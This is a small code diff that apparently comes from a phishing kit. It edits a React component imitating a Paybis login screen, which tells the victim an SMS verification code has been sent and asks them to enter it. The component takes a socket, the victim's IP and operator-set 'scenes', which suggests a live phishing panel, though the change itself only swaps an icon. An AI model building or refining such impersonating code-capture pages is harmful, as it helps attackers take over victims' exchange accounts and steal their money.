@@ -106,7 +106,7 @@ export default function PaybisOTPsms({ socket, ip,setCenaAtual,msgRecebida,mostr
           <div className="email-otp" country-code="BR">
             <div className="auth-app-header">{t('Login')}</div>
             <img src={envelope} alt="" className="email-otp__icon " />
-            <i data-v-198035f7="" class="icon icon-envelope-auth email-otp__icon"></i>
+            <i data-v-198035f7="" className="icon icon-chat email-otp__icon"></i>
             <p className="sent-notice">
               A text message with a six digit veritication code has been sent to phone ending in ********{msgRecebida}. Enter the code below to verify your access.
               <br />
